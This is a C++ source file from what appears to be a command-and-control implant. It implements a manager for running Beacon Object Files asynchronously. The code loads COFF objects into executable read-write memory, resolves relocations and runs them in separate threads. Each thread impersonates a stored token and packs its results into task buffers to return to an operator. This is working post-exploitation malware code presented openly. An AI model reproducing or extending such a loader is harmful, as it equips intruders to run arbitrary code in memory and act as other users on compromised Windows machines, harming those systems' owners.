#include "Boffer.h"
#include "bof_loader.h"
#include "utils.h"

Boffer* g_AsyncBofManager = NULL;

__declspec(thread) AsyncBofContext* tls_CurrentBofContext = nullptr;

extern HANDLE g_StoredToken;

void* Boffer::operator new(size_t sz)
{
    return MemAllocLocal(sz);
}

void Boffer::operator delete(void* p) noexcept
{
    MemFreeLocal(&p, sizeof(Boffer));
}

Boffer::Boffer()
{
    this->wakeupEvent = NULL;
}

Boffer::~Boffer()
{
    if (this->wakeupEvent) {
        ApiNt->NtClose(this->wakeupEvent);
        this->wakeupEvent = NULL;
    }
    ApiWin->DeleteCriticalSection(&this->managerLock);
}

BOOL Boffer::Initialize()
{
    this->wakeupEvent = ApiWin->CreateEventA(NULL, TRUE, FALSE, NULL);
    if (!this->wakeupEvent)
        return FALSE;
    
    ApiWin->InitializeCriticalSection(&this->managerLock);
    return TRUE;
}

AsyncBofContext* Boffer::CreateAsyncBof(ULONG taskId, CHAR* entryName, BYTE* coffFile, ULONG coffFileSize, BYTE* args, ULONG argsSize)
{
    AsyncBofContext* ctx = (AsyncBofContext*)MemAllocLocal(sizeof(AsyncBofContext));
    if (!ctx)
        return NULL;
    
    memset(ctx, 0, sizeof(AsyncBofContext));
    
    ctx->taskId = taskId;
    ctx->state = ASYNC_BOF_STATE_PENDING;
    
    ctx->coffFile = (BYTE*)MemAllocLocal(coffFileSize);
    if (!ctx->coffFile) {
        MemFreeLocal((LPVOID*)&ctx, sizeof(AsyncBofContext));
        return NULL;
    }
    memcpy(ctx->coffFile, coffFile, coffFileSize);
    ctx->coffFileSize = coffFileSize;
    
    if (args && argsSize > 0) {
        ctx->args = (BYTE*)MemAllocLocal(argsSize);
        if (!ctx->args) {
            MemFreeLocal((LPVOID*)&ctx->coffFile, coffFileSize);
            MemFreeLocal((LPVOID*)&ctx, sizeof(AsyncBofContext));
            return NULL;
        }
        memcpy(ctx->args, args, argsSize);
        ctx->argsSize = argsSize;
    }
    
    ULONG entryLen = StrLenA(entryName) + 1;
    ctx->entryName = (CHAR*)MemAllocLocal(entryLen);
    if (!ctx->entryName) {
        if (ctx->args)
            MemFreeLocal((LPVOID*)&ctx->args, argsSize);
        MemFreeLocal((LPVOID*)&ctx->coffFile, coffFileSize);
        MemFreeLocal((LPVOID*)&ctx, sizeof(AsyncBofContext));
        return NULL;
    }
    memcpy(ctx->entryName, entryName, entryLen);
    
    ctx->hStopEvent = ApiWin->CreateEventA(NULL, TRUE, FALSE, NULL);
    if (!ctx->hStopEvent) {
        MemFreeLocal((LPVOID*)&ctx->entryName, entryLen);
        if (ctx->args)
            MemFreeLocal((LPVOID*)&ctx->args, argsSize);
        MemFreeLocal((LPVOID*)&ctx->coffFile, coffFileSize);
        MemFreeLocal((LPVOID*)&ctx, sizeof(AsyncBofContext));
        return NULL;
    }
    
    ApiWin->InitializeCriticalSection(&ctx->outputLock);
    ctx->outputBuffer = new Packer();
    
    return ctx;
}

DWORD WINAPI AsyncBofThreadProc(LPVOID lpParameter)
{
    AsyncBofContext* ctx = (AsyncBofContext*)lpParameter;
    if (!ctx)
        return 1;
    
    tls_CurrentBofContext = ctx;
    
    if (g_StoredToken)
        ApiWin->ImpersonateLoggedOnUser(g_StoredToken);
    
    ctx->state = ASYNC_BOF_STATE_RUNNING;
    
    COF_HEADER* pHeader = (COF_HEADER*)ctx->coffFile;
    COF_SYMBOL* pSymbolTable = (COF_SYMBOL*)(ctx->coffFile + pHeader->PointerToSymbolTable);
    
    BOOL result = AllocateSections(ctx->coffFile, pHeader, ctx->mapSections);
    if (!result) {
        ctx->state = ASYNC_BOF_STATE_FINISHED;
        tls_CurrentBofContext = NULL;
        return 1;
    }
    
    ctx->mapFunctions = (LPVOID*)ApiWin->VirtualAlloc(NULL, MAP_FUNCTIONS_SIZE, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
    if (!ctx->mapFunctions) {
        CleanupSections(ctx->mapSections, MAX_SECTIONS);
        ctx->state = ASYNC_BOF_STATE_FINISHED;
        tls_CurrentBofContext = NULL;
        return 1;
    }
    
    result = ProcessRelocations(ctx->coffFile, pHeader, ctx->mapSections, pSymbolTable, ctx->mapFunctions);
    if (!result) {
        ApiWin->VirtualFree(ctx->mapFunctions, 0, MEM_RELEASE);
        ctx->mapFunctions = NULL;
        CleanupSections(ctx->mapSections, MAX_SECTIONS);
        ctx->state = ASYNC_BOF_STATE_FINISHED;
        tls_CurrentBofContext = NULL;
        return 1;
    }
    
    ApiWin->EnterCriticalSection(&ctx->outputLock);
    ctx->outputBuffer->Pack32(ctx->taskId);
    ctx->outputBuffer->Pack32(50);  // COMMAND_EXEC_BOF
    ctx->outputBuffer->Pack8(TRUE);
    ApiWin->LeaveCriticalSection(&ctx->outputLock);

    CHAR* entryFuncName = PrepareEntryName(ctx->entryName);
    if (entryFuncName) { 
        ExecuteProc(entryFuncName, ctx->args, ctx->argsSize, pSymbolTable, pHeader, ctx->mapSections);
        FreeFunctionName(entryFuncName);
    }
    
    if (ctx->mapFunctions) {
        ApiWin->VirtualFree(ctx->mapFunctions, 0, MEM_RELEASE);
        ctx->mapFunctions = NULL;
    }
    CleanupSections(ctx->mapSections, MAX_SECTIONS);

    ApiWin->EnterCriticalSection(&ctx->outputLock); 
    ctx->outputBuffer->Pack32(ctx->taskId);
    ctx->outputBuffer->Pack32(50);  // COMMAND_EXEC_BOF
    ctx->outputBuffer->Pack8(FALSE);
    ApiWin->LeaveCriticalSection(&ctx->outputLock);

    ctx->state = ASYNC_BOF_STATE_FINISHED;
    tls_CurrentBofContext = NULL;
    
    if (g_AsyncBofManager)
        g_AsyncBofManager->SignalWakeup();
    
    return 0;
}

BOOL Boffer::StartAsyncBof(AsyncBofContext* ctx)
{
    if (!ctx)
        return FALSE;
    
    ApiWin->EnterCriticalSection(&this->managerLock);
    
    ctx->hThread = ApiWin->CreateThread(NULL, 0, AsyncBofThreadProc, ctx, 0, &ctx->threadId);
    if (!ctx->hThread) {
        ApiWin->LeaveCriticalSection(&this->managerLock);
        return FALSE;
    }
    
    this->asyncBofs.push_back(ctx);
    
    ApiWin->LeaveCriticalSection(&this->managerLock);
    return TRUE;
}

BOOL Boffer::StopAsyncBof(ULONG taskId)
{
    HANDLE hThread = NULL;
    BOOL   found = FALSE;

    ApiWin->EnterCriticalSection(&this->managerLock);
    
    for (size_t i = 0; i < this->asyncBofs.size(); i++) {
        if (this->asyncBofs[i]->taskId == taskId) {
            AsyncBofContext* ctx = this->asyncBofs[i];
            found = TRUE;
            if (ctx->state == ASYNC_BOF_STATE_RUNNING) {
                if (ctx->hStopEvent)
                    ApiWin->SetEvent(ctx->hStopEvent);
                hThread = ctx->hThread;
            }
            ctx->state = ASYNC_BOF_STATE_STOPPED;
            break;
        }
    }
    
    ApiWin->LeaveCriticalSection(&this->managerLock);

    if (!found)
        return FALSE;

    if (hThread) {
        DWORD waitResult = ApiWin->WaitForSingleObject(hThread, 3000);
        if (waitResult == WAIT_TIMEOUT)
            ApiNt->NtTerminateThread(hThread, 0);
    }

    return TRUE;
}

void Boffer::ProcessAsyncBofs(Packer* outPacker)
{
    if (!outPacker || this->asyncBofs.size() == 0)
        return;
    
    ApiWin->EnterCriticalSection(&this->managerLock);
    
    for (size_t i = 0; i < this->asyncBofs.size(); i++) {
        AsyncBofContext* ctx = this->asyncBofs[i];
        
        BOOL threadAlive = FALSE;
        if (ctx->hThread) {
            DWORD exitCode = 0;
            ApiWin->GetExitCodeThread(ctx->hThread, &exitCode);
            threadAlive = (exitCode == STILL_ACTIVE);
        }
        
        if (threadAlive) {
            if (ApiWin->TryEnterCriticalSection(&ctx->outputLock)) {
                if (ctx->outputBuffer && ctx->outputBuffer->datasize() > 0) {
                    outPacker->PackFlatBytes(ctx->outputBuffer->data(), ctx->outputBuffer->datasize());
                    ctx->outputBuffer->Clear(TRUE);
                }
                ApiWin->LeaveCriticalSection(&ctx->outputLock);
            }
        } else {
            if (ctx->outputBuffer && ctx->outputBuffer->datasize() > 0) {
                outPacker->PackFlatBytes(ctx->outputBuffer->data(), ctx->outputBuffer->datasize());
                ctx->outputBuffer->Clear(TRUE);
            }
            if (ctx->state == ASYNC_BOF_STATE_RUNNING)
                ctx->state = ASYNC_BOF_STATE_FINISHED;
        }
    }
    
    ApiWin->LeaveCriticalSection(&this->managerLock);
    
    CleanupFinishedBofs();
}

void Boffer::CleanupFinishedBofs()
{
    Vector<AsyncBofContext*> pending;

    ApiWin->EnterCriticalSection(&this->managerLock);
    
    for (size_t i = 0; i < this->asyncBofs.size(); i++) {
        AsyncBofContext* ctx = this->asyncBofs[i];
        if (ctx->state == ASYNC_BOF_STATE_FINISHED || ctx->state == ASYNC_BOF_STATE_STOPPED) {
            pending.push_back(ctx);
            this->asyncBofs.remove(i);
            --i;
        }
    }
    
    ApiWin->LeaveCriticalSection(&this->managerLock);

    for (size_t i = 0; i < pending.size(); i++)
        CleanupBofContext(pending[i]);

    pending.destroy();
}

void Boffer::CleanupBofContext(AsyncBofContext* ctx)
{
    if (!ctx)
        return;
    
    if (ctx->hThread) {
        ApiWin->WaitForSingleObject(ctx->hThread, 5000);
        DWORD exitCode = 0;
        ApiWin->GetExitCodeThread(ctx->hThread, &exitCode);
        if (exitCode == STILL_ACTIVE)
            ApiNt->NtTerminateThread(ctx->hThread, 0);
        ApiNt->NtClose(ctx->hThread);
        ctx->hThread = NULL;
    }
    
    if (ctx->hStopEvent) {
        ApiNt->NtClose(ctx->hStopEvent);
        ctx->hStopEvent = NULL;
    }
    
    if (ctx->mapFunctions) {
        ApiWin->VirtualFree(ctx->mapFunctions, 0, MEM_RELEASE);
        ctx->mapFunctions = NULL;
    }
    CleanupSections(ctx->mapSections, MAX_SECTIONS);
    
    if (ctx->coffFile)
        MemFreeLocal((LPVOID*)&ctx->coffFile, ctx->coffFileSize);
    
    if (ctx->args)
        MemFreeLocal((LPVOID*)&ctx->args, ctx->argsSize);
    
    if (ctx->entryName)
        MemFreeLocal((LPVOID*)&ctx->entryName, StrLenA(ctx->entryName) + 1);

    ApiWin->DeleteCriticalSection(&ctx->outputLock);
    
    if (ctx->outputBuffer) {
        ctx->outputBuffer->Clear(FALSE);
        delete ctx->outputBuffer;
        ctx->outputBuffer = NULL;
    }
    
    MemFreeLocal((LPVOID*)&ctx, sizeof(AsyncBofContext));
}

AsyncBofContext* Boffer::FindBofByThreadId(DWORD threadId)
{
    ApiWin->EnterCriticalSection(&this->managerLock);
    
    AsyncBofContext* result = NULL;
    for (size_t i = 0; i < this->asyncBofs.size(); i++) {
        if (this->asyncBofs[i]->threadId == threadId) {
            result = this->asyncBofs[i];
            break;
        }
    }
    
    ApiWin->LeaveCriticalSection(&this->managerLock);
    return result;
}

HANDLE Boffer::GetWakeupEvent()
{
    return this->wakeupEvent;
}

void Boffer::SignalWakeup()
{
    if (this->wakeupEvent)
        ApiWin->SetEvent(this->wakeupEvent);
}
